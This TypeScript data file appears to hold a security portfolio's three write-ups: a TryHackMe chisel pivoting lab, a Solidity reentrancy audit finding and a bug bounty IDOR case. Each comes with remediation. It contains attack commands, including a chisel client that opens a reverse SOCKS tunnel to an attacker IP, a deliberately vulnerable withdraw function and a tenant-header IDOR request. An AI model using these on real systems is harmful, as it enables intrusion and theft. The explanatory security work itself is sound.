export interface Writeup {
  slug: string;
  title: string;
  excerpt: string;
  date: string;
  readTime: string;
  platformTag: "TryHackMe" | "BlockSec" | "Bug Bounty" | string;
  tags: string[];
  contentHtml: string;
}

export const writeups: Writeup[] = [
  {
    slug: "network-pivoting-chisel-socks5",
    title: "Network Pivoting & Chisel SOCKS5 Routing",
    excerpt: "Step-by-step routing of internal subnet traffic via reverse port forwarding and Chisel proxying into a segmented subnet.",
    date: "Oct 2026",
    readTime: "8 min",
    platformTag: "TryHackMe",
    tags: ["Network", "Pivoting", "Chisel", "Linux"],
    contentHtml: `
      <h2>1. Overview & Objectives</h2>
      <p>During a network penetration assessment, direct access to the internal database tier is frequently blocked by boundary firewalls. This lab demonstrates establishing a resilient reverse SOCKS5 tunnel through an initial Linux foothold using <code>chisel</code>.</p>
      
      <h2>2. Initial Footprint & Enumeration</h2>
      <p>A standard SYN scan on the dual-homed machine reveals an exposed HTTP service alongside an internal secondary interface (<code>10.10.20.0/24</code>):</p>
      <pre><code>nmap -sC -sV -p- 10.10.10.50</code></pre>
      
      <h2>3. Establishing the Chisel Reverse Tunnel</h2>
      <p>On the attacking machine, start the Chisel server in reverse mode:</p>
      <pre><code>chisel server -p 8000 --reverse</code></pre>
      
      <p>On the compromised target machine, launch the client and request a reverse SOCKS5 proxy:</p>
      <pre><code>./chisel client 10.10.14.15:8000 R:socks</code></pre>

      <h2>4. Pivoting Through Proxychains</h2>
      <p>Configure <code>/etc/proxychains4.conf</code> with <code>socks5 127.0.0.1 1080</code> to route discovery scans into the hidden subnet:</p>
      <pre><code>proxychains nmap -sT -Pn -p 22,80,3306 10.10.20.5</code></pre>

      <h2>5. Remediation & Hardening</h2>
      <ul>
        <li>Implement strict egress firewall rules preventing non-standard outbound TCP connections.</li>
        <li>Deploy host-based endpoint detection to identify unauthorized binary executions in <code>/tmp</code>.</li>
        <li>Segment management interfaces using dedicated jump-boxes with mandatory MFA.</li>
      </ul>
    `,
  },
  {
    slug: "flash-loan-reentrancy-vulnerability-audit",
    title: "Flash Loan State Manipulation & Reentrancy Audit",
    excerpt: "Root cause analysis of token balance update ordering prior to external call execution, audited with Foundry test harnesses.",
    date: "Oct 2026",
    readTime: "11 min",
    platformTag: "BlockSec",
    tags: ["Blockchain", "Solidity", "EVM", "Audit"],
    contentHtml: `
      <h2>1. Executive Summary</h2>
      <p>Smart contract security audits frequently encounter flawed state synchronization when handling ERC-20 token transfers and external hook execution. This write-up examines an audit finding in a lending pool contract vulnerable to cross-function reentrancy.</p>
      
      <h2>2. Vulnerable Code Analysis</h2>
      <p>The contract failed to apply the Checks-Effects-Interactions (CEI) pattern, transferring assets before adjusting internal ledger balances:</p>
      <pre><code>function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient funds");
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    balances[msg.sender] -= amount; // State updated after external call!
}</code></pre>
      
      <h2>3. Foundry Exploit Test Verification</h2>
      <p>We engineered an exploit contract demonstrating that calling <code>withdraw()</code> recursively from the fallback function completely drains pool reserves in a single block transaction.</p>

      <h2>4. Remediation</h2>
      <p>Apply OpenZeppelin's <code>ReentrancyGuard</code> (<code>nonReentrant</code> modifier) and update internal state balances prior to performing any external low-level calls.</p>
    `,
  },
  {
    slug: "idor-tenant-identity-parameter-bypass",
    title: "IDOR via Unchecked Tenant Identity Parameter",
    excerpt: "Bypassing authorization middleware and accessing cross-tenant user records due to client-supplied tenant ID trust.",
    date: "Sep 2026",
    readTime: "6 min",
    platformTag: "Bug Bounty",
    tags: ["API Security", "IDOR", "Web"],
    contentHtml: `
      <h2>1. Vulnerability Summary</h2>
      <p>During an authorized web API assessment, an Insecure Direct Object Reference (IDOR) was identified in the organization account settings endpoint, allowing cross-tenant data disclosure.</p>
      
      <h2>2. Proof of Concept</h2>
      <p>The client application included a header <code>X-Tenant-ID: 1042</code> which the backend authorization layer blindly trusted instead of extracting the tenant identity from the signed JWT session claims.</p>
      <pre><code>GET /api/v1/billing/invoices HTTP/1.1
Host: api.target.com
Authorization: Bearer [Attacker_JWT]
X-Tenant-ID: 1043</code></pre>
      
      <h2>3. Impact & Remediation</h2>
      <p>Authenticated users could access financial invoices belonging to any enterprise tenant. The remediation required extracting organization identifiers strictly from validated JWT claims on the server side.</p>
    `,
  },
];
